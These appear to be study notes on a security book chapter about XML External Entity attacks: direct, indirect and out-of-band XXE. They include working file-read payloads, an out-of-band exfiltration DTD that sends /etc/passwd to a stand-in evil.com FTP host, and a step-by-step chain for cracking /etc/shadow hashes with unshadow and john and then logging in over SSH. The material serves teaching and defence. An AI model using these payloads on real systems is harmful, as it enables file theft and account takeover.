# Chapter 27: XML External Entity

## Core Idea
XXE abuses the XML spec's external entity feature — a DTD directive that pulls in external files/URLs at parse time — to read arbitrary files or exfiltrate data from any server whose XML (or XML-like: SVG, HTML/DOM, PDF/XFDF, RTF) parser hasn't explicitly disabled external entity resolution.

## Frameworks Introduced
- **Direct vs. Indirect XXE**: classifies XXE by how the attacker payload reaches the parser.
  - When to use: triage any endpoint that accepts XML, or converts non-XML input into XML behind the scenes (e.g., syncing a field to a legacy XML/SOAP CRM).
  - How: Direct — attacker sends the malicious XML payload straight to the parsing endpoint and reads the entity content from the response. Indirect — attacker submits ordinary (non-XML) input; the server itself builds an XML document from that input and forwards it to an internal/legacy system, so the injected entity gets parsed downstream, often invisibly to a black-box tester. Detect indirect XXE via research into a target's enterprise integrations (CRM/HR/accounting vendors) and behavioral fingerprints (odd data-format constraints, cross-system leakage) rather than direct payload evidence.
- **Linux Account Takeover (ATO) workflow**: a chained exploitation pattern that turns one XXE bug into full remote shell access.
  - When to use: once any XXE (direct, indirect, or OOB) is confirmed on a Linux/Unix/BSD/WSL target.
  - How: read `/etc/passwd` -> read `/etc/shadow` -> identify hash algorithm from the `$id$` prefix -> crack the hash offline -> SSH in with recovered credentials.

## Key Concepts
- **External entity**: an XML DTD directive (`<!ENTITY name SYSTEM "uri">`) that imports content from an external file or URL into the document before parsing.
- **Predefined vs. custom entities**: predefined entities (`&amp;`, `&lt;`) always map to fixed characters; custom entities can reference arbitrary programmer- or attacker-defined data, including data outside the document.
- **Direct XXE**: XML with an external entity is sent straight to the server and the entity's content is returned in the response.
- **Indirect XXE**: the server itself constructs the XML (from non-XML user input) before passing it to an internal parser/downstream system, hiding the XML layer from the attacker.
- **Out-of-band (OOB) data exfiltration**: when a vulnerable parser doesn't reflect entity content in the response, data is instead streamed out via a side channel (FTP, or legacy Gopher) during parsing, using an externally hosted DTD.
- **Linux ATO**: chaining `/etc/passwd` -> `/etc/shadow` -> hash cracking -> SSH to fully compromise a Linux account via XXE alone.
- **`/etc/passwd`**: seven colon-separated fields per user (username, password location marker, UID, GID, comment, home dir, shell); an `x` in field 2 means the real hash lives in `/etc/shadow`.
- **`/etc/shadow`**: eight colon-separated fields per user; field 2 is the password hash in `$id$salt$hash` format, where `$id$` names the hashing algorithm.
- **`unshadow`**: utility that merges a stolen `/etc/passwd` and `/etc/shadow` into a single file format that John the Ripper/Hashcat can consume.

## Mental Models
- Think of external entities as a "remote file include" hidden inside XML parsing — any parser that follows the XML spec faithfully is, by default, a potential file-read primitive.
- Use Direct XXE thinking whenever an endpoint literally accepts XML (or an XML-superset format like SVG/RTF/PDF); use Indirect XXE thinking whenever a JSON/REST endpoint silently bridges to a legacy XML/SOAP backend.
- When the response doesn't echo entity data, switch mental models from "read the reflection" to "make the server call home" — OOB exfiltration turns a blind XXE into a working file-read channel via FTP/Gopher requests the attacker controls.
- Treat "XML parsers disable external entities by default" as false until verified per-parser/per-language — OWASP flags many Java XML parsers as historically XXE-enabled out of the box.

## Anti-patterns
- **Assuming external entity processing is off by default**: many parsers, especially Java-based ones, ship with external entities enabled; failing to check the specific parser's documentation leaves the door open even when developers believe it's "obviously" disabled.
- **Judging XXE risk only by whether an endpoint accepts raw XML**: indirect XXE shows that XML processing can happen invisibly behind a JSON/REST facade (e.g., syncing to a legacy CRM), so treating non-XML-looking endpoints as safe misses a real attack surface.
- **Relying only on response reflection to detect XXE**: a payload that fails to appear in the response isn't proof of no vulnerability — OOB exfiltration exists precisely because many real XXE bugs don't return data directly.

## Code Examples
```xml
<!-- Basic direct XXE file-read payload -->
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>

<!-- Full client-forged payload used against the mega-bank.com screenshot utility -->
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><xxe>&xxe;</xxe>

<!-- Out-of-band exfiltration: payload sent to the target server -->
<?xml version="1.0?>
<!DOCTYPE a [
<!ENTITY % dtd SYSTEM "https://evil.com/data.dtd">
%asd; %c;
]>
<a>&rrr;</a>

<!-- Out-of-band exfiltration: contents of the attacker-hosted data.dtd -->
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://evil.com/%d;'>">
```
- **What it demonstrates**: the first two payloads read a local file directly into the parser's output; the DTD pair demonstrates OOB exfiltration — the target fetches the attacker's external DTD, which nests a parameter entity around the local file and streams its contents line by line to the attacker's own FTP server, bypassing the need for any reflected response.

## Reference Tables
| Hash prefix (`$id$`) | Algorithm |
|---|---|
| `$1$` | MD5 |
| `$2a$` / `$2y$` | Blowfish (bcrypt) |
| `$5$` | SHA-256 |
| `$6$` | SHA-512 |
| `$y$` | yescrypt |

## Worked Example
Linux Account Takeover, end to end:
1. **Obtain system user data**: use any XXE (direct, indirect, or OOB) to read `/etc/passwd`. Confirm field 2 of the target user's entry is `x`, meaning the real hash is stored separately in `/etc/shadow`.
2. **Obtain password hashes**: use the same class of XXE to read `/etc/shadow`. Extract field 2 (`$id$salt$hash`) for the target user.
3. **Identify the algorithm**: match the `$id$` prefix against the table above (e.g., `$6$` = SHA-512) — this determines which cracking approach/tooling settings to use.
4. **Crack the hash**: save local copies (`passwd.txt`, `shadow.txt`), merge them with `unshadow passwd.txt shadow.txt > passwords.txt`, then run `john passwords.txt` (or Hashcat) to crack it; reveal results with `john --show passwords.txt`. Hashcat can use CPU and GPU simultaneously, while John the Ripper is limited to one or the other — prefer the fastest available hardware.
5. **SSH in**: with recovered username and plaintext password, run `ssh <username>@<website.com>` (or PuTTY on Windows) to authenticate and gain full remote control of that Linux user account — completing the ATO chain from a single XXE bug.

## Key Takeaways
1. Any XML (or XML-superset: SVG, HTML/DOM, PDF/XFDF, RTF) parsing endpoint is a candidate for XXE — test it even when the public API surface looks non-XML, since indirect XXE hides XML processing behind legacy system integrations.
2. Never assume external entities are disabled by default — verify per parser/language, since many Java-based parsers historically ship XXE-enabled.
3. If a response doesn't reflect entity data, don't conclude the target is safe — attempt OOB exfiltration via a hosted DTD and an FTP (or Gopher) external entity.
4. A single confirmed XXE can cascade into full account compromise: `/etc/passwd` reveals account structure, `/etc/shadow` yields crackable hashes, and the `$id$` prefix tells you exactly which algorithm you're up against.
5. Use `unshadow` to merge passwd/shadow files before feeding John the Ripper or Hashcat — these tools don't accept the raw Linux files directly.
6. XXE fixes are typically a single parser configuration line, which makes it worth testing on every new application regardless of how minor the XML surface looks — the fix-to-damage ratio is extreme in both directions.

## Connects To
- **Defending Against XXE chapter**: countermeasures for these attacks (disabling external entity resolution, e.g. `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`) are covered in the book's own Chapter 30, "Defending Against XXE."
- **SSRF (Server-Side Request Forgery)**: OOB exfiltration and the CRM-integration indirect XXE case both hinge on the server making outbound requests (FTP/HTTP/LDAP, or to a legacy backend) that the attacker influences — the same trust-boundary failure underlying SSRF.
- **DTD processing / parser configuration**: the root cause across both direct and OOB variants is a parser that resolves DTD-declared external entities; parser-level DTD/entity settings are the single control point for prevention.
